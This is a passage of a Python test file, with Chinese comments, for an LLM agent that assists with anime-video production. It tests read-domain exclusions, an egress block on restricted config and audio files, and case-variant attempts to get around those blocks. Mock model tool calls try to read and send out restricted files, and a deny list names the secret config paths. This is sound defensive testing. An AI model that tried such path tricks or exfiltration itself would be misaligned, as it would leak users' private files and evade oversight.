    listing = execute_tool("list_episodes", {}, ctx)
    assert listing["ok"] is True and "01-smoke" in listing["result"]["episodes"]

    # ③ /run：护栏拦下 --force-all，放行命令只回显不执行
    rejected = run_pipeline("tts --force-all", episode_dir=ep_dir, scope="pipeline")
    assert rejected["ok"] is False
    assert "禁止在 ava 中使用 --force-all" in rejected["message"]
    assert "--redo" in rejected["message"]

    pending = run_pipeline("clips", episode_dir=ep_dir, scope="pipeline", confirmed=False)
    assert pending["ok"] is True and pending["returncode"] is None
    assert str(ep_dir.resolve()) in pending["argv"]
    assert not (ep_dir / "04-clips.json").exists()  # 未确认 = 没跑

    # ④ 自愈循环上限与降级出口都存在（两条不同的闸，Spec PR4 注释）
    plain = tmp_path / "no-config"
    plain.mkdir()
    assert run_tool_loop([{"role": "user", "content": "hi"}], root=plain)["stopped"] == "degraded"
    assert local_directive_message("creative", "测试")["degraded"] is True


def test_llm_cli_creative_loop_degrades_without_key(tmp_path: Path, monkeypatch, capsys):
    """ava /chat 在无密钥下不崩：打印本地指示清单后退出（不装会）。"""
    from pipeline import paths
    from pipeline.agent import cli

    monkeypatch.setattr(paths, "ROOT", tmp_path)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    ep_dir = tmp_path / "data" / "episodes" / "01-smoke"
    ep_dir.mkdir(parents=True)
    (ep_dir / "01-topic.md").write_text("# t\n", encoding="utf-8")

    monkeypatch.setattr("builtins.input", lambda *a: (_ for _ in ()).throw(EOFError()))
    assert cli.run_creative_loop(ep_dir, "chat") == 0
    out = capsys.readouterr().out
    assert "降级模式" in out and "check_script" in out


# ---------------------------------------------------------------------------
# 6. 终审 P0-1 回归：读域硬排除 + 出网负载机械验证 + 会话不崩
# ---------------------------------------------------------------------------


def test_read_domain_hard_excludes_audio_and_patch_pools(tmp_path: Path):
    """03-audio/ 与 04-patch/ 属「一律不出网」清单，读域当场拒（终审 P0-1）。"""
    root = make_agent_root(tmp_path, "https://api.example.com/v1")
    ep = root / "data" / "episodes" / "T1"
    (ep / "03-audio").mkdir(parents=True)
    (ep / "03-audio" / "corrections.json").write_text('[{"seg": 5}]', encoding="utf-8")
    (ep / "03-audio" / "manifest.json").write_text("{}", encoding="utf-8")
    (ep / "03-audio" / "notes.md").write_text("录音笔记", encoding="utf-8")
    (ep / "04-patch").mkdir()
    (ep / "04-patch" / "pool.json").write_text("{}", encoding="utf-8")
    (ep / "04-clips.json").write_text('{"total_duration": 600}', encoding="utf-8")
    (ep / "02-script.draft.md").write_text("# 草稿", encoding="utf-8")

    ctx = ToolContext(scope="creative", episode_dir=ep, root=root)

    for bad in ("03-audio/corrections.json", "03-audio/manifest.json",
                "03-audio/notes.md", "04-patch/pool.json"):
        result = execute_tool("read_artifact", {"path": bad}, ctx)
        assert result["ok"] is False, f"{bad} 不该读得出来"
        assert "硬排除" in result["error"]

    # 二进制产物连读出都不给
    assert execute_tool("read_artifact", {"path": "05-final.mp4"}, ctx)["ok"] is False
    # 但别把整个期目录一并封死：排片产物不在禁列，照常可读
    assert execute_tool("read_artifact", {"path": "04-clips.json"}, ctx)["ok"] is True
    assert execute_tool("read_artifact", {"path": "02-script.draft.md"}, ctx)["ok"] is True


def test_egress_payload_never_contains_restricted_content(tmp_path: Path, monkeypatch):
    """§5 PR1 验收项的机械验证：交付给端点的请求体里没有 03-audio/config/pipeline 内容。

    这是 Y2-r19 的正向判据——不是「断言函数能拦字符串」，而是「实际发出去的字节里没有」。
    """
    with mock_llm_server([
        tool_call("read_artifact", {"path": "03-audio/corrections.json"}),
        tool_call("read_artifact", {"path": "02-script.draft.md"}, "call_2"),
        tool_call("read_status", {}, "call_3"),
        {"role": "assistant", "content": "做不到的部分我就不读了"},
    ]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)

        ep = root / "data" / "episodes" / "T1"
        (ep / "03-audio").mkdir(parents=True)
        (ep / "03-audio" / "corrections.json").write_text(
            '{"secret": "SEGRET-AUDIO-CORRECTIONS"}', encoding="utf-8")
        (ep / "03-audio" / "manifest.json").write_text(
            '{"secret": "SEGRET-AUDIO-MANIFEST"}', encoding="utf-8")
        (root / "config" / "cloud.local.json").write_text(
            '{"secret": "SEGRET-CONFIG"}', encoding="utf-8")
        (root / "pipeline").mkdir(exist_ok=True)
        (root / "pipeline" / "leak.py").write_text("SEGRET-PIPELINE", encoding="utf-8")
        (ep / "02-script.draft.md").write_text("# 正常草稿", encoding="utf-8")

        outcome = run_tool_loop(
            [{"role": "user", "content": "看看上期配音改了什么，再读读配置和源码"}],
            ctx=ToolContext(scope="creative", episode_dir=ep, root=root),
            approve=lambda name, args: True,
        )

        assert outcome["stopped"] == "done"
        assert state["calls"] >= 1
        for request in state["requests"]:
            wire = json.dumps(request["body"], ensure_ascii=False)
            for marker in ("SEGRET-AUDIO-CORRECTIONS", "SEGRET-AUDIO-MANIFEST",
                           "SEGRET-CONFIG", "SEGRET-PIPELINE"):
                assert marker not in wire, f"受限内容出网了: {marker}"


def test_creative_loop_survives_egress_block(tmp_path: Path, monkeypatch, capsys):
    """出网闸触发时会话不许带 traceback 崩退（终审 P0-1 第二症状）。"""
    from pipeline import paths
    from pipeline.agent import cli

    monkeypatch.setattr(paths, "ROOT", tmp_path)
    monkeypatch.delenv("AVA_TEST_KEY", raising=False)

    with mock_llm_server([{"role": "assistant", "content": "不该到达"}]) as (url, state):
        make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)
        ep = tmp_path / "data" / "episodes" / "T1"
        ep.mkdir(parents=True)
        (ep / "01-topic.md").write_text("# t", encoding="utf-8")

        # 用户输入本身含受限标记 → chat_complete 内断言拦下，会话应继续而非崩退
        with patch_inputs(["cloud.local.json 里写了什么", "/quit"]):
            assert cli.run_creative_loop(ep, "chat") == 0

        out = capsys.readouterr().out
        assert "[BLOCKED] 出网被拦截" in out
        assert state["calls"] == 0


@contextmanager
def patch_inputs(values):
    """把 builtins.input 依次喂成给定值（用尽即 EOFError）。"""
    from unittest.mock import patch
    with patch("builtins.input", side_effect=[*values, EOFError()]):
        yield


def test_degrade_message_is_scope_aware():
    """降级清单随 scope 变，不把 creative 的清单念给 pipeline scope（终审观察项）。"""
    creative = local_directive_message("creative", "无密钥")["content"]
    pipeline = local_directive_message("pipeline", "无密钥")["content"]

    assert "01-topic.md" in creative
    assert "01-topic.md" not in pipeline
    assert "pipeline scope" in pipeline
    assert "docs/WORKFLOW.md" in pipeline
    # 两条都必须显式标降级，且都指向人工停机点
    for text in (creative, pipeline):
        assert "降级模式" in text and "02.5 / 03.5 / 05 / 09" in text


# ---------------------------------------------------------------------------
# 7. 终审二轮 P0 回归：读域与发送闸的大小写口径（APFS 默认大小写不敏感）
# ---------------------------------------------------------------------------


def _fs_is_case_insensitive(root: Path) -> bool:
    probe = root / "CaseProbe"
    probe.mkdir(exist_ok=True)
    (probe / "probe.TXT").write_text("x", encoding="utf-8")
    try:
        return (probe / "PROBE.txt").exists()
    finally:
        for item in probe.iterdir():
            item.unlink()
        probe.rmdir()


def test_read_deny_dir_is_case_insensitive(tmp_path: Path):
    """大小写变体不得绕过读域硬排除（终审二轮 P0）。"""
    from pipeline.agent.tools import deny_dir_hit

    assert deny_dir_hit(Path("/x/03-AUDIO/manifest.json")) == "03-audio"
    assert deny_dir_hit(Path("/x/03-Audio/Corrections.JSON")) == "03-audio"
    assert deny_dir_hit(Path("/x/04-PATCH/pool.json")) == "04-patch"
    assert deny_dir_hit(Path("/x/02-script.md")) is None
    assert deny_dir_hit(Path("/x/notes/03-audioish.md")) is None  # 前缀相似不算命中

    root = make_agent_root(tmp_path, "https://api.example.com/v1")
    ep = root / "data" / "episodes" / "T1"
    (ep / "03-audio").mkdir(parents=True)
    (ep / "03-audio" / "manifest.json").write_text('{"engine":"SECRET-ENGINE"}', encoding="utf-8")
    ctx = ToolContext(scope="creative", episode_dir=ep, root=root)

    for bad in ("03-AUDIO/manifest.json", "03-Audio/MANIFEST.JSON", "04-PATCH/pool.json"):
        result = execute_tool("read_artifact", {"path": bad}, ctx)
        assert result["ok"] is False, f"{bad} 不该读得出来"
        assert "SECRET-ENGINE" not in json.dumps(result, ensure_ascii=False)

    if _fs_is_case_insensitive(tmp_path):
        # 部署语义（macOS/APFS）：必须报「硬排除」而不是「文件不存在」——
        # 说明拦住它的是护栏，不是巧合找不到文件
        assert "硬排除" in execute_tool(
            "read_artifact", {"path": "03-AUDIO/manifest.json"}, ctx
        )["error"]


def test_egress_boundary_matching_is_case_insensitive():
    """发送闸与读域同一判定口径：大小写变体同样命中（终审二轮 P0 的第二半）。"""
    from pipeline.agent.tools import assert_egress_boundary

    assert_egress_boundary("https://api.openai.com", {"k": "普通内容"})
    for bad in ("Cloud.Local.JSON", "03-AUDIO/MANIFEST.JSON", "03-Audio/Voice.json"):
        with pytest.raises(PermissionError, match="拦截出网请求"):
            assert_egress_boundary("https://api.openai.com", {"k": bad})


def test_egress_payload_blocks_case_variant_audio_read(tmp_path: Path, monkeypatch):
    """大小写变体路径的两层防线：读域拒了；标记一旦进入会话，发送闸把整轮掐掉。

    fail-closed 的实际形状：模型提议读 03-AUDIO/manifest.json → 读域拒绝 → 那条
    提议（含受限路径标记）留在会话里 → 下一轮请求被发送闸拦下。宁可整轮不发，
    也不给「半扇门」留缝。
    """
    with mock_llm_server([
        tool_call("read_artifact", {"path": "03-AUDIO/manifest.json"}),
        {"role": "assistant", "content": "读不到就算了"},
    ]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)
        ep = root / "data" / "episodes" / "T1"
        (ep / "03-audio").mkdir(parents=True)
        (ep / "03-audio" / "manifest.json").write_text(
            '{"secret": "SEGRET-ENGINE-UPPER"}', encoding="utf-8"
        )

        outcome = run_tool_loop(
            [{"role": "user", "content": "读一下那段音频清单"}],
            ctx=ToolContext(scope="creative", episode_dir=ep, root=root),
        )
        # Spec 9 §2.3 第 1 条：出网断言拒绝 = blocked + 回滚（不做收尾——同一份历史必然再被拒）
        assert outcome["stopped"] == "blocked"
        assert outcome["rollback"] is True
        assert "拦截出网请求" in outcome["error"]

        # 第一轮请求发出去了，但不含任何文件内容
        assert state["calls"] == 1
        wire = json.dumps(state["requests"][0]["body"], ensure_ascii=False)
        assert "SEGRET-ENGINE-UPPER" not in wire
        # 含受限标记的那一轮根本没发出去
        assert "03-audio/manifest.json" not in wire.casefold()


def test_case_variant_read_of_unpatterned_audio_file_never_leaves(tmp_path: Path, monkeypatch):
    """corrections.json 不在发送闸的字面量模式里 → 只能靠读域拦。

    这是终审二轮 P0 的原始形态：发送闸只认三个字面量文件名（cloud.local.json /
    03-audio/manifest.json / 03-audio/voice.json），读域一旦被大小写变体破开，
    未列入模式的文件就是真泄漏。本用例只在读域真的拦得住时才绿。
    """
    with mock_llm_server([
        tool_call("read_artifact", {"path": "03-AUDIO/corrections.json"}),
        {"role": "assistant", "content": "那我不读了"},
    ]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)
        ep = root / "data" / "episodes" / "T1"
        (ep / "03-audio").mkdir(parents=True)
        (ep / "03-audio" / "corrections.json").write_text(
            '{"secret": "SEGRET-CORRECTIONS-UPPER"}', encoding="utf-8"
        )

        outcome = run_tool_loop(
            [{"role": "user", "content": "看看上期的纠错记录"}],
            ctx=ToolContext(scope="creative", episode_dir=ep, root=root),
        )

        # 没被发送闸掐掉（会话里没出现受限标记）= 拦住它的是读域
        assert outcome["stopped"] == "done"
        assert state["calls"] == 2
        for request in state["requests"]:
            assert "SEGRET-CORRECTIONS-UPPER" not in json.dumps(
                request["body"], ensure_ascii=False
            )


def test_llm_config_prefers_agent_local_json_override(tmp_path: Path, monkeypatch):
    """config/agent.local.json 优先于 agent.json（仿照 cloud.local.json 惯例）。"""
    cfg_dir = tmp_path / "config"
    cfg_dir.mkdir(parents=True)
    (cfg_dir / "agent.json").write_text(json.dumps({
        "base_url": "https://api.openai.com/v1",
        "model": "gpt-4o",
        "api_key_env": "OPENAI_API_KEY",
    }), encoding="utf-8")
    (cfg_dir / "agent.local.json").write_text(json.dumps({
        "base_url": "http://127.0.0.1:8317/v1",
        "model": "gemini-3.8-flash-high",
        "api_key_env": "CPA_API_KEY",
    }), encoding="utf-8")

    monkeypatch.setenv("CPA_API_KEY", "test-cpa-key")
    cfg = load_llm_config(tmp_path)
    assert cfg is not None
    assert cfg.base_url == "http://127.0.0.1:8317/v1"
    assert cfg.model == "gemini-3.8-flash-high"
    assert cfg.api_key == "test-cpa-key"


def test_llm_write_topic_md_succeeds_when_human_approves(tmp_path: Path, monkeypatch):
    """人类在终端显式按 y 许可后，模型可以代笔写入 01-topic.md（Spec §2.4 B7）。

    模型在参数中未传 confirmed=True 时，只要 approve 回调返回 True，
    上下文便具备 confirmed=True，允许落盘；若拒绝则绝不落盘。
    """
    with mock_llm_server([
        tool_call("write_episode_file", {
            "filename": "01-topic.md",
            "content": "# 春物雪乃选题\n- 番剧：春物\n- 类型：人物志\n- 锚点：S3E11\n- 张力：自我牺牲与真实表达\n",
        }),
        {"role": "assistant", "content": "选题配置已为您写入 01-topic.md。"},
    ]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)
        ep = root / "data" / "episodes" / "01-approved"
        ep.mkdir(parents=True)

        outcome = run_tool_loop(
            [{"role": "user", "content": "帮我把讨论好的选题写进 01-topic.md"}],
            ctx=ToolContext(scope="creative", episode_dir=ep, root=root),
            approve=lambda name, args: True,  # 模拟人类敲 y
        )

        assert outcome["stopped"] == "done"
        assert (ep / "01-topic.md").exists()
        assert "自我牺牲与真实表达" in (ep / "01-topic.md").read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# T6–T11: idea scope 与无期选题会话测试 (Spec 2026-09-21-ava-entry-idea-scope §5.1)
# ---------------------------------------------------------------------------


def test_idea_scope_full_table_and_needs_episode_message(tmp_path: Path):
    """T6 按 D43 / Spec 17 改写：idea 与其余模式同一张全量工具表（不再精确等于 4 个只读工具）；
    需期工具在无期会话拿到「先建期」统一文案，只读工具不受影响。"""
    root = make_agent_root(tmp_path, "https://api.example.com/v1")
    schemas = build_tool_schemas(root=root)
    names = [s["function"]["name"] for s in schemas]
    assert names == _expected_schema_names()

    from pipeline.agent.tools import NEEDS_EPISODE_TOOLS, NO_EPISODE_MESSAGE, TOOL_SCHEMAS
    assert NEEDS_EPISODE_TOOLS == {"write_episode_file", "cover_edit", "run_pipeline", "acquire_propose"}

    ctx_idea = ToolContext(scope="idea", episode_dir=None, root=root)
    for name in ("write_episode_file", "cover_edit", "run_pipeline", "acquire_propose"):
        args = {"filename": "01-topic.md", "content": "x", "command": "status", "candidates": [{}]}
        denied = execute_tool(name, args, ctx_idea)
        assert denied["ok"] is False, name
        assert NO_EPISODE_MESSAGE in denied["error"], (name, denied)

    # 只读工具在 idea 下不受影响
    ok = execute_tool("list_episodes", {}, ctx_idea)
    assert ok["ok"] is True


def test_idea_turn_context_and_system_prompt(monkeypatch, tmp_path):
    """T7: idea 回合 ToolContext.episode_dir 为 None 且 scope == 'idea'；assemble_system_prompt 含 director 人格与 idea 卡。

    D42 / Spec 18 改写：idea 会话落库级 `data/_idea/session.jsonl`，不能再对真实仓库根跑
    （数据盘不在时拒启动，在时会写进真 data/）——改在临时根上跑，`config/` 软链真仓库的配置。
    """
    from unittest.mock import patch
    from pipeline.agent.cli import assemble_system_prompt, run_agent_loop

    prompt = assemble_system_prompt(None, "idea", None)
    assert "Director" in prompt or "导演" in prompt
    assert "模式: 选题会话（无期）" in prompt
    assert "scope: idea" in prompt

    captured_ctx = []

    def fake_run_tool_loop(messages, *, ctx, approve=None, config=None, timeout=None, **_):
        captured_ctx.append(ctx)
        return {"stopped": "done", "messages": messages, "final": {"content": "ok"}}

    import pipeline.agent.llm as llm_mod
    monkeypatch.setattr(llm_mod, "load_llm_config", lambda r=None: llm_mod.LLMConfig(base_url="http://x", model="m", api_key="k"))
    monkeypatch.setattr(llm_mod, "run_tool_loop", fake_run_tool_loop)

    # 通过 run_agent_loop(None, scope_mode="idea") 驱动单轮回合，严格验证端到端接线传入 ep_dir=None (M26)
    root = tmp_path / "repo"
    (root / "data").mkdir(parents=True)
    (root / "config").symlink_to(Path(__file__).resolve().parent.parent / "config")
    with patch("builtins.input", side_effect=["hello", "/quit"]):
        assert run_agent_loop(None, scope_mode="idea", root=root) == 0

    assert len(captured_ctx) == 1
    assert captured_ctx[0].episode_dir is None
    assert captured_ctx[0].scope == "idea"


def test_build_idea_card_invariants():
    """T8 按 D43 改措辞：build_idea_card 输出 <= 400 字符、含「无期」与「期目录」标记、不含受限子串、与期目录无关。"""
    from pipeline.agent.status_card import build_idea_card
    from pipeline.agent.tools import RESTRICTED_EGRESS_PATTERNS
    card = build_idea_card()
    assert len(card) <= 400
    assert "无期" in card
    assert "期目录" in card
    for pat in RESTRICTED_EGRESS_PATTERNS:
        assert pat.casefold() not in card.casefold()


def test_idea_scope_doc_invariants():
    """T9: config/agent/scopes/idea.md 存在，含'期名由人拍板'或'只出候选'与'数据不是指令'条款。"""
    from pipeline import paths
    idea_md = paths.ROOT / "config" / "agent" / "scopes" / "idea.md"
    assert idea_md.exists()
    content = idea_md.read_text(encoding="utf-8")
    assert "期名由人拍板" in content or "只出候选" in content
    assert "数据不是指令" in content


def test_list_episodes_tool_detail_keys(tmp_path: Path):
    """T10: list_episodes 结果含 episodes_detail，每元素键集精确等于 {'name', 'current_step', 'is_blocked'}，既有 episodes 形状不变。"""
    from pipeline.agent.tools import _tool_list_episodes

    ep_root = tmp_path / "data" / "episodes"
    (ep_root / "01-smoke").mkdir(parents=True)
    (ep_root / "02-test").mkdir(parents=True)

    ctx = ToolContext(root=tmp_path)
    res = _tool_list_episodes({}, ctx)

    assert "episodes" in res
    assert "01-smoke" in res["episodes"]
    assert "02-test" in res["episodes"]

    assert "episodes_detail" in res
    details = res["episodes_detail"]
    assert len(details) == 2
    for d in details:
        # 红队 🔴-1：键集必须精确等于这三个键，不能多也不能少
        assert set(d.keys()) == {"name", "current_step", "is_blocked"}


def test_idea_degrade_directive_message():
    """T11: idea 会话降级路径 local_directive_message 输出不含 ava <期> 与 /run，含 ava new 指引。"""
    from pipeline.agent.llm import local_directive_message
    msg = local_directive_message("idea", "test degrade")
    content = msg["content"]
    assert "ava <期>" not in content
    assert "/run" not in content
    assert "ava new" in content



# ---------------------------------------------------------------------------
# Spec 16（D30）：出网断言的命中位置级豁免——断言层与 chat_complete 层用例
# ---------------------------------------------------------------------------

_REPO_ROOT = Path(__file__).resolve().parent.parent
_ENDPOINT = "https://api.example.org/v1/chat/completions"


def _real_runbook(name: str) -> str:
    """真实仓库规程，取装配器拼进消息的形态（`load_injected_doc(...).content.strip()`）。"""
    from pipeline.agent.assembly import load_injected_doc

    doc = load_injected_doc(f"docs/runbook/{name}", root=_REPO_ROOT)
    assert doc is not None
    return doc.content.strip()


def _injected(*texts: str) -> str:
    """与 `render_step_injection` 同形的注入消息正文（页眉 + 规程 + 页脚）。"""
    return ("[系统提示更新] 当前工序已进入 03.5 配音顺听 / 04 排片。\n\n请遵循以下规程：\n\n---\n\n"
            + "\n\n---\n\n".join(texts) + "\n\n---\n\n**注意**：以上规程仅适用于当前工序。")


def _payload(*messages: tuple[str, object]) -> dict:
    return {"model": "m", "messages": [{"role": r, "content": c} for r, c in messages]}


def test_td2b_td2c_tool_args_and_tool_results_still_block_via_chat_complete(monkeypatch) -> None:
    """TD-2b / TD-2c：可信集里有规程，模型工具参数里的 `03-AUDIO/MANIFEST.JSON`、工具返回值里的
    `agent.local.json` 照旧拦（走真 chat_complete，urlopen 零调用）。"""
    from pipeline.agent import llm

    calls: list = []
    monkeypatch.setattr(llm.urllib.request, "urlopen", lambda *a, **k: calls.append(a))
    cfg = llm.LLMConfig(base_url="https://api.example.org/v1", model="mock", api_key="sk-fake")
    rb = _real_runbook("03.5-voice-check.md")
    base = [{"role": "system", "content": "s"}, {"role": "user", "content": _injected(rb)}]
    call = {"id": "c1", "type": "function",
            "function": {"name": "read_artifact", "arguments": '{"path": "03-AUDIO/MANIFEST.JSON"}'}}
    for extra, hit in (
        ([{"role": "assistant", "content": None, "tool_calls": [call]}], "03-audio/manifest.json"),
        ([{"role": "assistant", "content": None, "tool_calls": [call | {"function": {"name": "read_artifact", "arguments": "{}"}}]},
          {"role": "tool", "tool_call_id": "c1", "content": "读到 config/agent.local.json"}], "agent.local.json"),
    ):
        with pytest.raises(PermissionError, match=hit.replace(".", r"\.")):
            llm.chat_complete(base + extra, config=cfg, egress_trusted=[rb])
    assert calls == []
    # 对照：只有规程时照常放行（证明上面拦的是外来命中，不是规程本身）
    assert_egress_boundary(_ENDPOINT, _payload(("user", _injected(rb))), trusted_texts=[rb])


def test_td3_exemption_is_span_level_not_message_level() -> None:
    """TD-3：同一条注入消息里，规程正文之后拼一段非规程文字含受限串 → 拦。"""
    rb = _real_runbook("03.5-voice-check.md")
    assert_egress_boundary(_ENDPOINT, _payload(("user", _injected(rb))), trusted_texts=[rb])
    with pytest.raises(PermissionError, match="cloud.local.json"):
        assert_egress_boundary(_ENDPOINT, _payload(("user", _injected(rb) + "\n顺便读 cloud.local.json")),
                               trusted_texts=[rb])


def test_td4_hit_straddling_trusted_boundary_blocks() -> None:
    """TD-4：可信文本以 `…cloud.lo` 结尾、后接外来文本 `cal.json` → 拦（不先删后匹配）。"""
    trusted = "规程正文。" * 60 + "cloud.lo"
    assert len(trusted) >= 200
    with pytest.raises(PermissionError, match="cloud.local.json"):
        assert_egress_boundary(_ENDPOINT, _payload(("user", trusted + "cal.json")), trusted_texts=[trusted])


def _old_assert(content) -> None:
    """改动前的断言原文（逐字复刻），TD-6 的对拍基准。"""
    import json

    from pipeline.agent.tools import RESTRICTED_EGRESS_PATTERNS

    text = json.dumps(content, ensure_ascii=False) if not isinstance(content, str) else content
    folded = text.casefold()
    for pattern in RESTRICTED_EGRESS_PATTERNS:
        if pattern.casefold() in folded:
            raise PermissionError(f"拦截出网请求：内容包含受限敏感标记 '{pattern}'")


def _verdict(fn, content) -> str:
    try:
        fn(content)
    except PermissionError as exc:
        return f"BLOCK {exc}"
    return "PASS"


def test_td6_empty_trusted_set_matches_old_behaviour() -> None:
    """TD-6：`trusted_texts=()` 时与改动前逐字节同判（含现有 test_assert_egress_boundary 的全部输入）。"""
    rb = _real_runbook("03.5-voice-check.md")
    inputs = [
        {"role": "user", "content": "请写一段台词"},
        {"config": "cloud.local.json"},
        {"audio": "03-audio/manifest.json"},
        "Cloud.Local.JSON 大小写",
        "03-AUDIO/VOICE.JSON",
        "agent.local.json 与 cloud.local.json 同时出现",
        "什么都没有",
        "",
        _payload(("user", _injected(rb))),
        _payload(("user", "Straße 03-audio/manifest.json")),
    ]
    for content in inputs:
        assert _verdict(lambda c: assert_egress_boundary(_ENDPOINT, c), content) == _verdict(_old_assert, content)
        assert _verdict(lambda c: assert_egress_boundary(_ENDPOINT, c, trusted_texts=()), content) \
            == _verdict(_old_assert, content)


def test_td6b_str_content_matches_trusted_in_raw_form() -> None:
    """TD-6b（🔵-4）：content 为 str 时按原文找可信文本（含换行的可信文本能认出），规程外拼受限串照拦。"""
    trusted = ("第一行说明\n" * 30) + "产物：data/episodes/<期号>/03-audio/manifest.json\n" + ("尾行\n" * 10)
    trusted = trusted.strip()
    assert len(trusted) >= 200
    assert_egress_boundary(_ENDPOINT, "前缀\n" + trusted + "\n后缀", trusted_texts=[trusted])
    with pytest.raises(PermissionError, match="agent.local.json"):
        assert_egress_boundary(_ENDPOINT, "前缀\n" + trusted + "\nagent.local.json", trusted_texts=[trusted])


def test_td7_casefold_length_change_keeps_coordinates() -> None:
    """TD-7：可信文本含 `ß`（casefold 变长）、受限串在其后：该放的放、该拦的拦。"""
    trusted = "Straße " * 40 + "03-audio/manifest.json"
    assert len(trusted) >= 200
    assert_egress_boundary(_ENDPOINT, _payload(("user", trusted)), trusted_texts=[trusted])
    with pytest.raises(PermissionError, match="cloud.local.json"):
        assert_egress_boundary(_ENDPOINT, _payload(("user", trusted + " cloud.local.json")), trusted_texts=[trusted])


def test_td7b_pattern_at_exact_trusted_edges_is_exempt() -> None:
    """TD-7b（🔵-3，MUT-D8 的指定杀手）：模式恰在可信文本开头、恰在结尾，各一例都放行。"""
    pad = "规程说明" * 60
    for trusted in ("03-audio/manifest.json" + pad, pad + "03-audio/manifest.json"):
        assert len(trusted) >= 200
        assert_egress_boundary(_ENDPOINT, _payload(("user", trusted)), trusted_texts=[trusted])
        assert_egress_boundary(_ENDPOINT, trusted, trusted_texts=[trusted])


def test_td8_short_trusted_text_gets_no_exemption() -> None:
    """TD-8（🔵-1）：短于门槛的可信文本不给豁免——模型在工具参数里复述「见 …manifest.json。」照拦；
    门槛边界 199 拦、200 放。"""
    from pipeline.agent.tools import TRUSTED_TEXT_MIN_CHARS

    assert TRUSTED_TEXT_MIN_CHARS == 200
    short = "见 03-audio/manifest.json。"
    with pytest.raises(PermissionError, match="03-audio/manifest.json"):
        assert_egress_boundary(_ENDPOINT, _payload(("user", short), ("tool", f"读 {short} 失败")), trusted_texts=[short])
    for n, blocked in ((199, True), (200, False)):
        trusted = "y" * (n - len("03-audio/manifest.json")) + "03-audio/manifest.json"
        assert len(trusted) == n
        if blocked:
            with pytest.raises(PermissionError):
                assert_egress_boundary(_ENDPOINT, _payload(("user", trusted)), trusted_texts=[trusted])
        else:
            assert_egress_boundary(_ENDPOINT, _payload(("user", trusted)), trusted_texts=[trusted])


# ---------------------------------------------------------------------------
# 2026-10-08 spec §B/§C：草稿写入留底；search_notes 检索字幕
# ---------------------------------------------------------------------------


def _subs_root(tmp_path: Path, episodes: dict[str, list[tuple[float, str]]], topic: str = "番: 东京喰种\n") -> tuple[Path, Path]:
    """按 subindex 的 WINDOW=2 拼接规则造索引（unit_i = line_i + " " + line_{i+1}，末单元单句）。"""
    root = tmp_path
    ep = root / "data" / "episodes" / "01-subs"
    ep.mkdir(parents=True)
    (ep / "01-topic.md").write_text(topic, encoding="utf-8")
    index = root / "data" / "library" / "index"
    index.mkdir(parents=True)
    for name, lines in episodes.items():
        units = []
        for i in range(len(lines)):
            chunk = lines[i:i + 2]
            units.append({"anime": name.split("_")[0], "start": chunk[0][0], "end": chunk[-1][0] + 1,
                          "text": " ".join(t for _s, t in chunk)})
        (index / f"{name}.json").write_text(
            json.dumps({"meta": {"kind": "subtitle", "window": 2}, "units": units}, ensure_ascii=False),
            encoding="utf-8")
    return root, ep


def test_search_subs_restores_single_lines_and_context(tmp_path: Path) -> None:
    root, ep = _subs_root(tmp_path, {
        "东京喰种_S01E05": [(170.0, "说吧 你来干什么"), (173.0, "听说你身体不舒服 我来探病"), (176.0, "哼 两手空空？")],
        "东京喰种_S01E09": [(505.0, "从那之后雏实就和董香一起住了"), (511.0, "渐渐地 恢复了以前的开朗")],
    })
    ctx = ToolContext(episode_dir=ep, root=root)
    out = execute_tool("search_notes", {"source": "subs", "query": "探病"}, ctx)
    assert out["ok"], out
    assert out["result"]["hits"] == [{"ep": "S01E05", "time": "02:53", "text": "听说你身体不舒服 我来探病",
                                       "context": ["说吧 你来干什么", "哼 两手空空？"]}]
    # 每句只命中一次（滑窗里同一句出现两次，还原后不重复）
    assert len(execute_tool("search_notes", {"source": "subs", "query": "雏实"}, ctx)["result"]["hits"]) == 1
    # 限定集号后查不到别集的戏
    assert execute_tool("search_notes", {"source": "subs", "query": "探病", "episode": "S01E09"}, ctx)["result"]["hits"] == []


def test_search_subs_transcript_mode(tmp_path: Path) -> None:
    root, ep = _subs_root(tmp_path, {"东京喰种_S01E09": [(505.0, "甲 乙"), (511.0, "丙"), (600.0, "丁")]})
    out = execute_tool("search_notes", {"source": "subs", "episode": "s01e09"}, ToolContext(episode_dir=ep, root=root))
    assert out["ok"], out
    assert out["result"]["transcript"] == "08:25 甲 乙\n08:31 丙\n10:00 丁"
    assert out["result"]["truncated"] is False


def test_search_subs_anime_isolation_and_errors(tmp_path: Path) -> None:
    root, ep = _subs_root(tmp_path, {
        "东京喰种_S01E01": [(1.0, "金木")],
        "东京喰种re_S01E01": [(1.0, "金木 佐佐木")],  # 番名前缀相同的另一部番，不得混入
    })
    ctx = ToolContext(episode_dir=ep, root=root)
    hits = execute_tool("search_notes", {"source": "subs", "query": "金木"}, ctx)["result"]["hits"]
    assert [h["text"] for h in hits] == ["金木"]
    # 无期会话必须显式给番名
    assert execute_tool("search_notes", {"source": "subs", "query": "金木"}, ToolContext(root=root))["ok"] is False
    no_ep = execute_tool("search_notes", {"source": "subs", "query": "金木", "anime": "东京喰种re"}, ToolContext(root=root))
    assert [h["text"] for h in no_ep["result"]["hits"]] == ["金木 佐佐木"]
    # query 与 episode 都没有、集号格式不对、source 非法 → 报错不静默
    for bad in ({"source": "subs"}, {"source": "subs", "episode": "第九集"}, {"source": "video", "query": "x"}):
        assert execute_tool("search_notes", bad, ctx)["ok"] is False, bad


def test_search_subs_rejects_non_window_structure(tmp_path: Path) -> None:
    root, ep = _subs_root(tmp_path, {})
    (root / "data" / "library" / "index" / "东京喰种_S01E02.json").write_text(json.dumps({
        "meta": {}, "units": [{"start": 1.0, "text": "甲"}, {"start": 2.0, "text": "乙"}]}), encoding="utf-8")
    out = execute_tool("search_notes", {"source": "subs", "query": "甲"}, ToolContext(episode_dir=ep, root=root))
    assert out["ok"] is False and "滑窗" in out["error"]


def test_search_subs_on_real_index_if_mounted() -> None:
